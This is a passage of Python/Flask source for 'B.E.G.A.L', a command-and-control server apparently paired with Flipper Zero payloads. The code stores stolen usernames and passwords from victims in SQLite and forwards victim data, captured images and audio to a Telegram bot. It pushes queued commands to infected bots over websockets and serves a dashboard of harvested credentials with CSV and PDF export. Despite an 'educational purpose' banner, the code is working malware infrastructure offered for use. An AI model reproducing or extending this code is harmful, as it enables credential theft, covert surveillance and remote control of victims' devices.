                db_filename = ACTIVE_SESSIONS[uuid]["db_file"]
                conn = sqlite3.connect(db_filename)
                c = conn.cursor()
                c.execute('''CREATE TABLE IF NOT EXISTS credentials
                             (os TEXT, ip TEXT, url TEXT, username TEXT, password TEXT, timestamp TEXT)''')
                
                creds_dict = data_object.get("creds", {})
                c.execute("INSERT INTO credentials VALUES (?, ?, ?, ?, ?, ?)",
                          (data_object.get("platform", "Unknown"), client_ip, data_object.get("url", ""), 
                           creds_dict.get("username", ""), creds_dict.get("password", ""), vault_entry["timestamp"]))
                conn.commit()
                conn.close()
            except Exception as e:
                logging.error(f"Failed to save to local DB: {e}")



        # Kirim pembaruan sesi ke semua dashboard yang terhubung

        socketio.emit('sessions_update', get_active_bots(), room='dashboard')



        # Cek dan kirim perintah dari antrean jika bot terhubung via websocket

        if uuid in BOT_SESSIONS:

            sid = BOT_SESSIONS[uuid]

            if uuid in BOT_COMMAND_QUEUES and BOT_COMMAND_QUEUES[uuid]:

                command = BOT_COMMAND_QUEUES[uuid].pop(0)

                socketio.emit('execute_command', command, room=sid)

                logging.info(f"Sent queued command {command.get('name')} to {uuid}")



        return jsonify({"ok": True, "description": "Data diterima"}), 200



    except Exception as e:

        logging.error(f"Collector error: {e}")

        return jsonify({"ok": False, "status": 500, "description": f"Galat internal collector: {str(e)}"}), 500



def send_to_telegram(client_ip, data_object):

    """Helper untuk memformat dan mengirim data ke Telegram."""

    message_type = data_object.get("type", "Data")

    url_victim = data_object.get("url", "N/A")

    victim_os = data_object.get("platform", "Unknown OS")

    uuid = data_object.get("uuid", "N/A")

    image_data = data_object.pop("imageData", None)

    audio_data = data_object.pop("audioData", None)

    

    pretty_json = json.dumps(data_object, indent=2)

    base_caption = (f"⚫️ B.E.G.A.L • {message_type.upper()} ⚫️\n\n"

                    f"🆔 UUID: {uuid}\n"

                    f"🌐 IP: {client_ip}\n"

                    f"💻 OS: {victim_os}\n"

                    f"🔗 URL: {url_victim}\n"

                    f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")



    tg_url_base = f"https://api.telegram.org/bot{BOT_TOKEN}/"

    

    try:

        if audio_data and audio_data.startswith("data:audio"):

            header, encoded = audio_data.split(",", 1)

            file_ext = header.split(";")[0].split("/")[1].split(';')[0]

            file_bytes = base64.b64decode(encoded)

            files = {"audio": (f"rec_{int(datetime.now().timestamp())}.{file_ext}", io.BytesIO(file_bytes))}

            requests.post(tg_url_base + "sendAudio", data={"chat_id": CHAT_ID, "caption": base_caption}, files=files, timeout=60)

        elif image_data and image_data.startswith("data:image"):

            header, encoded = image_data.split(",", 1)

            file_ext = header.split(";")[0].split("/")[1]

            file_bytes = base64.b64decode(encoded)

            files = {"document": (f"cap_{int(datetime.now().timestamp())}.{file_ext}", io.BytesIO(file_bytes))}

            requests.post(tg_url_base + "sendDocument", data={"chat_id": CHAT_ID, "caption": base_caption + f"--- METADATA ---\n{pretty_json}"}, files=files, timeout=45)

        else:

            full_message = base_caption + f"--- DATA ---\n{pretty_json}"

            if len(full_message) > 4096: full_message = full_message[:4090] + "\n... (truncated)"

            requests.post(tg_url_base + "sendMessage", json={"chat_id": CHAT_ID, "text": full_message})

    except Exception as e:

        logging.error(f"Telegram send failed: {e}")



# ================== KONTROL C2 VIA WEBSOCKET ==================

@socketio.on('connect')

def handle_connect():

    """Menangani koneksi baru, bisa dari bot atau dashboard."""

    logging.info(f"Client connected: {request.sid}")



@socketio.on('dashboard_connect')

def handle_dashboard_connect():

    """Saat UI dashboard terhubung, masukkan ke room 'dashboard'."""

    if session.get('logged_in'):

        join_room('dashboard')

        logging.info(f"Dashboard {request.sid} joined room 'dashboard'.")

        # Kirim data sesi & status saat ini ke dashboard yang baru terhubung

        emit('sessions_update', get_active_bots())

        emit('vault_update', CREDENTIAL_VAULT)

        emit('bot_status_update', BOT_MONITORING_ACTIVE)

    else:

        logging.warning(f"Unauthorized dashboard connection attempt from {request.sid}.")



@socketio.on('bot_register')

def handle_bot_register(data):

    """Saat bot terhubung & mendaftar dengan UUID-nya."""

    uuid = data.get('uuid')

    if uuid:

        BOT_SESSIONS[uuid] = request.sid

        join_room(uuid)

        logging.info(f"Bot {uuid} registered with SID {request.sid}")

        # Kirim status monitoring saat ini ke bot

        emit('execute_command', {'name': 'SET_MONITORING', 'enabled': BOT_MONITORING_ACTIVE})

        # Cek jika ada perintah yang menunggu untuk bot ini

        if uuid in BOT_COMMAND_QUEUES and BOT_COMMAND_QUEUES[uuid]:

            command = BOT_COMMAND_QUEUES[uuid].pop(0)

            emit('execute_command', command, room=request.sid)

            logging.info(f"Sent queued command {command.get('name')} to {uuid}")



@socketio.on('disconnect')

def handle_disconnect():

    """Menangani saat client (bot atau dashboard) disconnect."""

    # Hapus bot dari BOT_SESSIONS jika disconnect

    disconnected_uuid = None

    for uuid, sid in BOT_SESSIONS.items():

        if sid == request.sid:

            disconnected_uuid = uuid

            break

    if disconnected_uuid:

        del BOT_SESSIONS[disconnected_uuid]

        logging.info(f"Bot {disconnected_uuid} disconnected.")

    else:

        logging.info(f"Dashboard or unknown client {request.sid} disconnected.")



@socketio.on('send_command')

def handle_send_command(data):

    """Menerima perintah dari dashboard untuk dikirim ke bot."""

    if not session.get('logged_in'): return

    uuid = data.get('uuid')

    command = data.get('command')

    if not uuid or not command: return



    sid = BOT_SESSIONS.get(uuid)

    if sid: # Jika bot terhubung via websocket, kirim langsung

        emit('execute_command', command, room=sid)

        logging.info(f"Sent command {command.get('name')} to {uuid} via WebSocket.")

    else: # Jika tidak, tambahkan ke antrean

        if uuid not in BOT_COMMAND_QUEUES:

            BOT_COMMAND_QUEUES[uuid] = []

        BOT_COMMAND_QUEUES[uuid].append(command)

        logging.info(f"Queued command {command.get('name')} for offline bot {uuid}.")



@socketio.on('toggle_bot_status')

def handle_toggle_status():

    """Mengubah status monitoring bot secara global."""

    if not session.get('logged_in'): return

    global BOT_MONITORING_ACTIVE

    BOT_MONITORING_ACTIVE = not BOT_MONITORING_ACTIVE

    logging.info(f"Bot monitoring status toggled to: {BOT_MONITORING_ACTIVE}")

    # Beri tahu semua bot & dashboard tentang status baru

    command = {'name': 'SET_MONITORING', 'enabled': BOT_MONITORING_ACTIVE}

    emit('execute_command', command, broadcast=True, include_self=False) # Kirim ke semua bot yg connect

    emit('bot_status_update', BOT_MONITORING_ACTIVE, room='dashboard') # Kirim ke semua dashboard








# ... existing code ...
# ================== RUTE REPORTING ==================
@app.route('/report')
def report():
    if not session.get('logged_in'):
        return redirect(url_for('index'))
    import glob
    import sqlite3
    import urllib.parse
    import json
    
    db_files = glob.glob('*.db')
    all_data = []
    domain_counts = {}

    for db_file in db_files:
        try:
            conn = sqlite3.connect(db_file)
            c = conn.cursor()
            c.execute("SELECT * FROM credentials")
            rows = c.fetchall()
            for r in rows:
                os_val, ip_val, url_val, user_val, pass_val, ts_val = r
                domain = urllib.parse.urlparse(url_val).netloc or url_val[:30]
                domain_counts[domain] = domain_counts.get(domain, 0) + 1
                all_data.append({
                    "db": db_file, "os": os_val, "ip": ip_val, 
                    "url": url_val, "domain": domain,
                    "user": user_val, "pass": pass_val, "ts": ts_val
                })
            conn.close()
        except:
            pass

    top_domains = sorted(domain_counts.items(), key=lambda x: x[1], reverse=True)[:4]
    
    # DevSecOps Patch: Sanitasi JSON untuk inline-JS menghindari XSS dan escape error
    safe_json_data = json.dumps(all_data).replace("<", "\\u003c").replace(">", "\\u003e")
    
    html = f'''<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>B.E.G.A.L REPORT</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&family=VT323&display=swap" rel="stylesheet">
    
    <!-- Modul Tambahan: PDF Generator untuk Kebutuhan Forensik/Pelaporan -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.31/jspdf.plugin.autotable.min.js"></script>

    <script>
        tailwind.config = {{
            theme: {{
                extend: {{
                    fontFamily: {{ mono: ['"JetBrains Mono"', 'monospace'], lcd: ['"VT323"', 'monospace'] }},
                    colors: {{ flipper: {{ orange: '#FF8C00', orangeLight: '#FFB85C' }} }}
                }}
            }}
        }}
    </script>
    <style>
        .custom-scrollbar::-webkit-scrollbar {{ width: 6px; height: 6px; }}
        .custom-scrollbar::-webkit-scrollbar-track {{ background: rgba(0, 0, 0, 0.2); }}
        .custom-scrollbar::-webkit-scrollbar-thumb {{ background: #FF8C00; border-radius: 4px; }}
        details > summary {{ list-style: none; }}
        details > summary::-webkit-details-marker {{ display: none; }}
    </style>
</head>
<body class="bg-[#080809] text-gray-100 font-mono min-h-screen relative overflow-x-hidden selection:bg-flipper-orange selection:text-black pb-10">
    <!-- Ambient Grid Background -->
    <div class="fixed inset-0 bg-[linear-gradient(to_right,#1f1f23_1px,transparent_1px),linear-gradient(to_bottom,#1f1f23_1px,transparent_1px)] bg-[size:4rem_4rem] [mask-image:radial-gradient(ellipse_60%_50%_at_50%_50%,#000_70%,transparent_100%)] opacity-30 pointer-events-none z-0"></div>

    <div class="relative z-10 max-w-6xl mx-auto px-4 py-8">
        
        <!-- HEADER -->
        <header class="flex items-center justify-between border-b border-zinc-800 pb-6 mb-8">
            <div class="flex items-center gap-4">
                <div class="w-12 h-12 bg-flipper-orange text-black flex flex-col items-center justify-center font-black rounded-lg border-2 border-black">
                    <span class="text-[10px] leading-none tracking-tighter">FLIP</span>
                    <span class="text-lg leading-none font-extrabold">0</span>
                </div>
                <div>
                    <h1 class="text-2xl font-extrabold tracking-wider text-white">B.E.G.A.L <span class="text-flipper-orange">REPORT</span></h1>
                    <p class="text-neutral-500 text-xs mt-0.5 tracking-widest uppercase">Stolen Credential Vault Archives</p>
                </div>
            </div>
            <a href="/" class="px-4 py-2 border border-neutral-800 hover:border-flipper-orange text-neutral-400 hover:text-flipper-orange rounded-xl text-xs font-bold transition-colors">
                <i class="fa-solid fa-arrow-left mr-2"></i> BACK TO DASHBOARD
            </a>
        </header>

        <!-- DASHBOARD ANALYTICS -->
        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
            <div class="bg-neutral-900 border border-neutral-800 p-5 rounded-2xl relative overflow-hidden group hover:border-flipper-orange/50 transition-colors">
                <div class="absolute -right-4 -top-4 text-5xl text-neutral-800/30 group-hover:text-flipper-orange/10 transition-colors"><i class="fa-solid fa-skull"></i></div>
                <div class="text-xs text-neutral-500 font-bold uppercase tracking-widest mb-1">TARGETS COMPROMISE</div>
                <div class="text-4xl font-black text-white">{len(db_files)}</div>
            </div>
            <div class="bg-neutral-900 border border-neutral-800 p-5 rounded-2xl relative overflow-hidden group hover:border-emerald-500/50 transition-colors">
                <div class="absolute -right-4 -top-4 text-5xl text-neutral-800/30 group-hover:text-emerald-500/10 transition-colors"><i class="fa-solid fa-key"></i></div>
                <div class="text-xs text-neutral-500 font-bold uppercase tracking-widest mb-1">CREDENTIAL HARVESTED</div>
                <div class="text-4xl font-black text-emerald-400">{len(all_data)}</div>
            </div>
            <div class="bg-neutral-900 border border-neutral-800 p-5 rounded-2xl relative overflow-hidden group hover:border-blue-500/50 transition-colors">
                <div class="absolute -right-4 -top-4 text-5xl text-neutral-800/30 group-hover:text-blue-500/10 transition-colors"><i class="fa-solid fa-globe"></i></div>
                <div class="text-xs text-neutral-500 font-bold uppercase tracking-widest mb-3">TOP TARGETED DOMAINS</div>
                <div class="space-y-1.5">
                    {''.join([f'<div class="flex justify-between text-xs"><span class="truncate text-blue-400 max-w-[150px]">{d[0]}</span><span class="text-neutral-400 font-bold">{d[1]}</span></div>' for d in top_domains])}
                    {'' if top_domains else '<div class="text-xs text-neutral-600">Belum ada data</div>'}
                </div>
            </div>
        </div>

        <!-- CONTROLS TOOLBAR -->
        <div class="flex flex-col md:flex-row items-center gap-4 bg-neutral-900/50 border border-neutral-800 p-4 rounded-xl mb-6">
            <div class="relative w-full md:w-96 flex-shrink-0">
                <i class="fa-solid fa-search absolute left-3.5 top-1/2 -translate-y-1/2 text-neutral-500"></i>
                <input type="text" id="searchInput" placeholder="Search IP, URL, Username, Password..." class="w-full bg-neutral-950 border border-neutral-700 focus:border-flipper-orange text-sm text-white rounded-lg pl-10 pr-4 py-2.5 outline-none font-mono transition-colors">
            </div>
            <div class="flex items-center justify-between w-full">
                <div class="flex bg-neutral-950 rounded-lg p-1 border border-neutral-800">
                    <button onclick="setView('target')" id="btn-view-target" class="px-4 py-1.5 text-xs font-bold rounded-md bg-neutral-800 text-white transition-colors"><i class="fa-solid fa-network-wired mr-1.5"></i> Group by : Target</button>
                    <button onclick="setView('domain')" id="btn-view-domain" class="px-4 py-1.5 text-xs font-bold rounded-md text-neutral-500 hover:text-white transition-colors"><i class="fa-solid fa-globe mr-1.5"></i> Group by: Service</button>
                </div>
                <div class="flex items-center gap-2">
                    <button onclick="exportCSV()" class="px-3 md:px-4 py-2 bg-neutral-800 hover:bg-neutral-700 text-white border border-neutral-700 hover:border-emerald-500 rounded-lg text-xs font-bold transition-colors flex items-center gap-2">
                        <i class="fa-solid fa-file-csv text-emerald-400"></i> <span class="hidden md:inline">CSV</span>
                    </button>
                    <button onclick="exportPDF()" class="px-3 md:px-4 py-2 bg-neutral-800 hover:bg-neutral-700 text-white border border-neutral-700 hover:border-red-500 rounded-lg text-xs font-bold transition-colors flex items-center gap-2">
                        <i class="fa-solid fa-file-pdf text-red-500"></i> <span class="hidden md:inline">PDF</span>
                    </button>
                </div>
            </div>
        </div>

        <!-- CONTENT ACCORDIONS -->
        <div id="report-container" class="space-y-4"></div>

    </div>

    <!-- NOTIFICATION TOAST -->
    <div id="toast" class="fixed bottom-5 left-1/2 -translate-x-1/2 bg-emerald-900/90 text-emerald-100 border border-emerald-500/50 px-6 py-3 rounded-full text-sm font-bold shadow-lg opacity-0 pointer-events-none transition-opacity duration-300 z-50 flex items-center gap-2">
        <i class="fa-solid fa-circle-check"></i> <span id="toast-msg">Tersalin ke papan klip!</span>
    </div>

    <footer class="text-center text-[10px] text-neutral-600 tracking-widest font-bold mt-12 mb-4">
        GENERATE BY B.E.G.A.L 2026 - XSANLAHCI
    </footer>

    <!-- INJECTED DATA AND LOGIC -->
    <script>
        // Membaca data JSON yang telah disanitasi oleh Python dengan aman
        const reportData = {safe_json_data};
        let currentView = 'target';

        function render() {{
            const container = document.getElementById('report-container');
            const searchQ = document.getElementById('searchInput').value.toLowerCase();
            
            // PATCH: Mengatasi nilai 'null' dengan fallback (d.val || '') agar JS tidak error
            let filtered = reportData.filter(d => 
                (d.url || '').toLowerCase().includes(searchQ) || 
                (d.user || '').toLowerCase().includes(searchQ) || 
                (d.pass || '').toLowerCase().includes(searchQ) || 
                (d.ip || '').toLowerCase().includes(searchQ)
            );

            // Group Data
            let grouped = {{}};
            filtered.forEach(d => {{
                let key = currentView === 'target' ? `${{d.ip}} (${{d.os}})` : d.domain;
                if (!grouped[key]) grouped[key] = [];
                grouped[key].push(d);
            }});

            container.innerHTML = '';
            
            if(Object.keys(grouped).length === 0) {{
                container.innerHTML = `<div class="p-12 text-center text-neutral-500 border border-neutral-800 rounded-2xl border-dashed">Tidak ada data ditemukan.</div>`;
                return;
            }}

            for (const [key, items] of Object.entries(grouped)) {{
                let icon = currentView === 'target' ? 'fa-desktop' : 'fa-server text-blue-500';
                
                let tableRows = items.map(i => `
                    <tr class="border-b border-neutral-800/50 hover:bg-neutral-800/40 transition-colors group/row">
                        <td class="p-3 text-neutral-300 max-w-[200px] truncate" title="${{i.url}}">${{i.url}}</td>
                        <td class="p-3 text-emerald-400">
                            <div class="flex items-center justify-between">
                                <span class="truncate pr-2">${{i.user || '<i class="text-neutral-600">N/A</i>'}}</span>
                                <button onclick="copyTxt('${{i.user || ''}}')" class="opacity-0 group-hover/row:opacity-100 text-neutral-500 hover:text-white transition-opacity"><i class="fa-regular fa-copy"></i></button>
                            </div>
                        </td>
                        <td class="p-3 text-flipper-orange">
                            <div class="flex items-center justify-between">
                                <span class="truncate font-bold pr-2">${{i.pass || '<i class="text-neutral-600">N/A</i>'}}</span>
                                <button onclick="copyTxt('${{i.pass || ''}}')" class="opacity-0 group-hover/row:opacity-100 text-neutral-500 hover:text-white transition-opacity"><i class="fa-regular fa-copy"></i></button>
                            </div>
                        </td>
                        <td class="p-3 text-neutral-500 text-xs">${{i.ts}}</td>
                    </tr>
                `).join('');

                let dbInfoBadge = currentView === 'target' ? `<span class="hidden md:inline-block mr-3 text-[10px] text-neutral-500 tracking-wider">SRC: ${{items[0].db}}</span>` : '';

                let html = `
                    <details class="bg-neutral-900 border border-neutral-800 rounded-xl overflow-hidden group mb-4" ${{searchQ ? 'open' : ''}}>
                        <summary class="p-4 bg-neutral-900 cursor-pointer flex items-center justify-between hover:bg-neutral-800/80 transition-colors">
                            <div class="flex items-center gap-3">
                                <div class="w-8 h-8 rounded-lg bg-neutral-950 flex items-center justify-center border border-neutral-800"><i class="fa-solid ${{icon}}"></i></div>
                                <span class="font-bold text-white tracking-wider text-sm md:text-base">${{key}}</span>
                            </div>
                            <div class="flex items-center">
                                ${{dbInfoBadge}}
                                <span class="px-2.5 py-1 bg-red-500/10 text-red-500 border border-red-500/20 rounded text-xs font-bold mr-4">${{items.length}} CREDS</span>
                                <div class="w-6 h-6 rounded-full bg-neutral-950 flex items-center justify-center border border-neutral-800"><i class="fa-solid fa-chevron-down text-neutral-500 group-open:rotate-180 transition-transform text-xs"></i></div>
                            </div>
                        </summary>
                        <div class="p-0 overflow-x-auto border-t border-neutral-800">
                            <table class="w-full text-left text-sm whitespace-nowrap">
                                <thead class="bg-neutral-950 text-neutral-500 text-[10px] font-bold uppercase tracking-widest border-b border-neutral-800">
                                    <tr>
                                        <th class="p-4">Target URL Location</th>
                                        <th class="p-4 w-1/4">Username / Identity</th>
                                        <th class="p-4 w-1/4">Password / Secret</th>
                                        <th class="p-4">Time Captured</th>
                                    </tr>
                                </thead>
                                <tbody class="custom-scrollbar">${{tableRows}}</tbody>
                            </table>
                        </div>
                    </details>
                `;
                container.insertAdjacentHTML('beforeend', html);
            }}
        }}

        function setView(view) {{
            currentView = view;
            const btnTarget = document.getElementById('btn-view-target');
            const btnDomain = document.getElementById('btn-view-domain');
            
            if(view === 'target') {{
                btnTarget.className = "px-4 py-1.5 text-xs font-bold rounded-md bg-neutral-800 text-white transition-colors";
                btnDomain.className = "px-4 py-1.5 text-xs font-bold rounded-md text-neutral-500 hover:text-white transition-colors";
            }} else {{
                btnDomain.className = "px-4 py-1.5 text-xs font-bold rounded-md bg-neutral-800 text-white transition-colors";
                btnTarget.className = "px-4 py-1.5 text-xs font-bold rounded-md text-neutral-500 hover:text-white transition-colors";
            }}
            render();
        }}

        function copyTxt(txt) {{
            if(!txt) return;
            navigator.clipboard.writeText(txt);
            const toast = document.getElementById('toast');
            toast.classList.remove('opacity-0');
            setTimeout(() => toast.classList.add('opacity-0'), 2000);
        }}

        // PATCH: Penggunaan object Blob memastikan string JS tidak terpotong oleh python f-string
        function exportCSV() {{
            if(reportData.length === 0) return alert("Tidak ada data untuk di ekspor.");
            
            let csvRows = ["IP,OS,Domain,URL,Username,Password,Timestamp"];
            
            reportData.forEach(r => {{
                let safeUrl = (r.url || '').replace(/"/g, '""');
                let safeUser = (r.user || '').replace(/"/g, '""');
                let safePass = (r.pass || '').replace(/"/g, '""');
                csvRows.push(`"${{r.ip}}","${{r.os}}","${{r.domain}}","${{safeUrl}}","${{safeUser}}","${{safePass}}","${{r.ts}}"`);
            }});
            
            const blob = new Blob([csvRows.join(String.fromCharCode(10))], {{ type: 'text/csv;charset=utf-8;' }});
            const url = URL.createObjectURL(blob);
            const link = document.createElement("a");
            link.setAttribute("href", url);
            link.setAttribute("download", `BEGAL_Export_${{new Date().getTime()}}.csv`);
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            URL.revokeObjectURL(url);
        }}

        // FITUR BARU: Ekspor Laporan PDF Menggunakan library jsPDF & AutoTable
        function exportPDF() {{
            if(reportData.length === 0) return alert("Tidak ada data untuk di ekspor.");
            
            const {{ jsPDF }} = window.jspdf;
            const doc = new jsPDF('landscape'); // Menggunakan ukuran landscape agar tabel lebih luas
            
            // Header PDF
            doc.setFont("monospace");
            doc.text("B.E.G.A.L - C2 Vault Report", 14, 15);
            doc.setFontSize(10);
            doc.text("Target Credential Harvesting Database", 14, 21);
            
            const tableColumn = ["IP Address / OS", "Domain Target", "Username", "Password", "Time Captured"];
            const tableRows = [];
            
            reportData.forEach(r => {{
                const rowData = [
                    `${{r.ip}} (${{r.os}})`,
                    r.domain,
                    r.user || 'N/A',
                    r.pass || 'N/A',
                    r.ts
                ];
                tableRows.push(rowData);
            }});
            
            doc.autoTable({{
                head: [tableColumn],
                body: tableRows,
                startY: 28,
                theme: 'grid',
                styles: {{ fontSize: 8, font: "monospace", cellPadding: 2 }},
                headStyles: {{ fillColor: [255, 140, 0], textColor: [0, 0, 0], fontStyle: 'bold' }},
                alternateRowStyles: {{ fillColor: [240, 240, 240] }}
            }});
            
            doc.save(`BEGAL_Export_${{new Date().getTime()}}.pdf`);
        }}

        // Init
        document.getElementById('searchInput').addEventListener('input', render);
        render(); // Initial load
    </script>
</body>
</html>'''
    return html

@app.route('/api/v1/status', methods=['GET'])
# ... existing code ...

def get_status():

    uuid = request.args.get('uuid')

    cmd = None

    if uuid and uuid in BOT_COMMAND_QUEUES and BOT_COMMAND_QUEUES[uuid]:

        cmd = BOT_COMMAND_QUEUES[uuid].pop(0)

    

    return jsonify({

        "monitoringEnabled": BOT_MONITORING_ACTIVE,

        "command": cmd

    })



@app.route('/health')

def health():

    return jsonify({"status": "online", "tool": "Flipper Zero Blackhat C2", "author": "xsanlahci"})



if __name__ == '__main__':
    print("\033[92m" + "="*70)
    print ("     ▄▄▄▄▄▄▄    ▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄    ▄▄▄▄   ▄▄▄      ")
    print ("     ███▀▀███▄ ███▀▀▀▀▀ ███▀▀▀▀▀  ▄██▀▀██▄ ███      ")  
    print ("     ███▄▄███▀ ███▄▄    ███       ███  ███ ███      ")
    print ("     ███  ███▄ ███      ███  ███▀ ███▀▀███ ███      ")
    print ("     ████████▀ ▀███████ ▀██████▀  ███  ███ ████████ ") 
    print ("   Backdoor Exfiltration Gateway for Advanced Looting")
    print("           Just For Educational Purpose")
    print("     Author: xsanlahci • Running on http://0.0.0.0:31337")
    print("="*70 + "\033[0m")

    socketio.run(app, host='0.0.0.0', port=31337, debug=False, allow_unsafe_werkzeug=True)
